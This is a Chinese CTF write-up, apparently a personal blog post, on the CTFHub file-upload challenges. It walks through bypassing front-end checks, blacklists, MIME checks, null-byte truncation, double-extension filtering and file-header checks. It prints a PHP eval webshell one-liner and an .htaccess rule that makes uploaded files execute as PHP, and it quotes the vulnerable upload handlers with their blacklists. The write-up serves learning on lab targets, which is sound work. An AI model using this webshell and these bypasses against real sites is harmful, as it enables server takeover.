# CTFHub-文件上传学习

<div class="has-toc have-toc">
</div>

## 0x00 前言

菜鸡记录汇总下文件上传的学习过程。

## 0x01 无验证<figure class="wp-block-image size-large">

<img loading="lazy" width="520" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-28.png" alt="" class="wp-image-1648" /> </figure> 

随便上传一个文件，得到上传文件相对路径upload/.txt，输入url后能够正常访问。写一句话木马到1.php，`<?php @eval($_POST['cmd']);?>`。上传后，通过菜刀或蚁剑连接。<figure class="wp-block-image size-large">

<img loading="lazy" width="1279" height="299" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-29.png" alt="" class="wp-image-1652" /> </figure> 

打开文件，找到flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="450" height="58" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-30.png" alt="" class="wp-image-1653" /> </figure> 

## 0x02 前端验证

查看源代码可发现

<pre id="line1" class="wp-block-code"><code>function checkfilesuffix()
{
    var file=document.getElementsByName('file')&#91;0]&#91;'value'];
    if(file==""||file==null)
    {
        alert("请添加上传文件");
        return false;
    }
    else
    {
        var whitelist=new Array(".jpg",".png",".gif");
        var file_suffix=file.substring(file.lastIndexOf("."));
        if(whitelist.indexOf(file_suffix) == -1)
        {
            alert("该文件不允许上传");
            return false;
        }
    }
}</code></pre>

将1.php的后缀名改为合法的，再上传，然后抓包改filename。<figure class="wp-block-image size-large">

<img loading="lazy" width="497" height="157" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-31.png" alt="" class="wp-image-1656" /> </figure> 

即可绕过成功。这里也提供另一种绕过方法，直接禁用js。<figure class="wp-block-image size-large">

<img loading="lazy" width="699" height="401" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-33.png" alt="" class="wp-image-1658" /> </figure> 

## 0x03 .htaccess

题目：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

查看源代码

<pre id="line1" class="wp-block-code"><code>if (!empty($_POST&#91;'submit'])) {
    $name = basename($_FILES&#91;'file']&#91;'name']);
    $ext = pathinfo($name)&#91;'extension'];
    $blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf");
    if (!in_array($ext, $blacklist)) {
        if (move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], UPLOAD_PATH . $name)) {
            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";
            echo "上传文件相对路径&lt;br&gt;" . UPLOAD_URL_PATH . $name;
        } else {
            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";
        }
    } else {
        echo "&lt;script&gt;alert('文件类型不匹配')&lt;/script&gt;";
    }
}</code></pre>

写一个`.htaccess`文件，设置当前目录下所有文件都会被解析成php代码执行，内容如下。

<pre class="wp-block-code"><code>&lt;IfModule mime_module&gt;
SetHandler application/x-httpd-php
&lt;/IfModule&gt;</code></pre>

上传后，再上传1.png的木马文件，拿webshell连接即可得到flag。

## 0x04 MIME绕过

•扩展名：gif MIME类型：image/gif

•扩展名：png MIME类型：image/png

•扩展名：jpg MIME类型：image/jpeg

•扩展名：js MIME类型：text/javascript

•扩展名：htm/html MIME类型：text/html<figure class="wp-block-image size-large">

<img loading="lazy" width="537" height="199" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-34.png" alt="" class="wp-image-1660" /> </figure> 

抓包后修改content-type字段为合法类型，上传成功，重复上面的步骤，get flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="475" height="97" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-35.png" alt="" class="wp-image-1662" /> </figure> 

## 0x05 00截断

题目：了解一下 PHP 5.2 00截断上传的原理

<pre id="line1" class="wp-block-code"><code>if (!empty($_POST&#91;'submit'])) {
    $name = basename($_FILES&#91;'file']&#91;'name']);
    $info = pathinfo($name);
    $ext = $info&#91;'extension'];
    $whitelist = array("jpg", "png", "gif");
    if (in_array($ext, $whitelist)) {
        $des = $_GET&#91;'road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
        if (move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], $des)) {
            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";
        } else {
            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";
        }
    } else {
        echo "文件类型不匹配";
    }
}</code></pre><figure class="wp-block-image size-large">

<img loading="lazy" width="1045" height="362" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-36.png" alt="" class="wp-image-1665" /> </figure> 

将木马文件更名为1.png.php，因为url地址栏出现了?road=/var/www/htm/ 没有返回文件的路径地址，多半是有临时文件名的存在，文件存储路径为road，在后面加上0.php%00，截断路径。上传文件就被保存到了upload/0.php下。<figure class="wp-block-image size-large">

<img loading="lazy" width="819" height="376" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-38.png" alt="" class="wp-image-1670" /> </figure> 

最后重复上面的步骤，get flag。

## 0x06 双写后缀

<pre id="line1" class="wp-block-code"><code>$name = basename($_FILES&#91;'file']&#91;'name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);</code></pre>

这道题目会将黑名单中的后缀替换为空，更改木马后缀名为1.phasap，会替换掉asa，从而生成php。连接蚁剑，得到flag。

## 0x07 文件头检查<figure class="wp-block-image size-large">

<img loading="lazy" width="734" height="583" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-39.png" alt="" class="wp-image-1677" /> </figure> 

在恶意脚本前加上允许上传文件的头标识，同时抓包修改content-type字段。<figure class="wp-block-image size-large">

<img loading="lazy" width="744" height="68" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-40.png" alt="" class="wp-image-1678" /> </figure> 

最后重复上面的步骤，get flag。
